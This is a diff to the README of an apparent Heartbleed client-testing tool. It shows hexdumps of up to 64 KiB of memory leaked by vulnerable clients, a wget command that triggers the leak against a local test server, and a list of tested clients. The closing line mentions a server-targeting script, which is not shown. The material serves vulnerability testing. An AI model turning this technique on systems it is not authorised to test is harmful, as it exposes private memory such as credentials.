@@ -24,22 +24,29 @@ If you are not vulnerable, the server outputs something like:
 If you *are* vulnerable, you will see something like:
 
     Connection from: 127.0.0.1:40738
-    Client returned 16384 (0x4000) bytes
-    0000: 18 03 03 40 00 02 40 00 2d 03 03 52 34 c6 6d 86  ...@..@.-..R4.m.
+    Client returned 65535 (0xffff) bytes
+    0000: 18 03 03 40 00 02 ff ff 2d 03 03 52 34 c6 6d 86  ...@....-..R4.m.
     0010: 8d e8 40 97 da ee 7e 21 c4 1d 2e 9f e9 60 5f 05  ..@...~!.....`_.
     0020: b0 ce af 7e b7 95 8c 33 42 3f d5 00 c0 30 00 00  ...~...3B?...0..
     0030: 05 00 0f 00 01 01 00 00 00 00 00 00 00 00 00 00  ................
     0040: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
     *
+    4000: 00 00 00 00 00 18 03 03 40 00 00 00 00 00 00 00  ........@.......
+    8000: 00 00 00 00 00 00 00 00 00 00 18 03 03 40 00 00  .............@..
+    ...
+    e440: 1d 2e 9f e9 60 5f 05 b0 ce af 7e b7 95 8c 33 42  ....`_....~...3B
+    e450: 3f d5 00 c0 30 00 00 05 00 0f 00 01 01 00 00 00  ?...0...........
+    fff0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00     ...............
 
-Note that there were 16 KiB of leaked bytes, the output moddeled after `xxd` and
-replaces subsequent lines of NUL bytes with an `*`.
+
+Subsequent lines full of NUL bytes are folded into one with an `*` thereafter
+(like the `xxd` tool).
 
 An example where more "interesting" memory gets leaked using
 `wget -O /dev/null https://google.com https://localhost:4433`:
 
     Connection from: 127.0.0.1:41914
-    Client returned 16384 (0x4000) bytes
+    Client returned 65535 (0xffff) bytes
     0000: 18 03 03 40 00 02 ff ff 2d 03 03 52 34 c6 6d 86  ...@....-..R4.m.
     0010: 8d e8 40 97 da ee 7e 21 c4 1d 2e 9f e9 60 5f 05  ..@...~!.....`_.
     0020: b0 ce af 7e b7 95 8c 33 42 3f d5 00 c0 30 00 00  ...~...3B?...0..
@@ -62,16 +69,21 @@ An example where more "interesting" memory gets leaked using
     0c10: af 98 ee 61 f2 84 3f 12 00 00 00 00 00 00 00 00  ...a..?.........
     0c20: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
     *
+    4000: 00 00 00 00 00 18 03 03 40 00 00 00 00 00 00 00  ........@.......
+    ...
+    ffd0: 00 00 00 00 5c d3 3c 02 00 00 00 00 49 53 4f 36  ....\.<.....ISO6
+    ffe0: 34 36 2d 53 45 2f 2f 00 53 45 4e 5f 38 35 30 32  46-SE//.SEN_8502
+    fff0: 30 30 5f 42 2f 2f 00 00 00 00 00 00 00 00 00     00_B//.........
 
 ## Tested clients
 The following clients have been tested against 1.0.1f and leaked memory before
 the handshake:
 
  - MariaDB 5.5.36
- - wget 1.15 (leaks memory of earlier connections)
+ - wget 1.15 (leaks memory of earlier connections and own state)
  - curl 7.36.0
- - git 1.9.1 (tested clone / push, 54 non-NUL bytes were leaked)
- - nginx 1.4.7 (in proxy mode, 54 non-NUL bytes were leaked)
+ - git 1.9.1 (tested clone / push, leaks not much)
+ - nginx 1.4.7 (in proxy mode, leaks memory of previous requests)
 
 # ssltest.py
 This repository also contains a working version that targets servers. ssltest.py
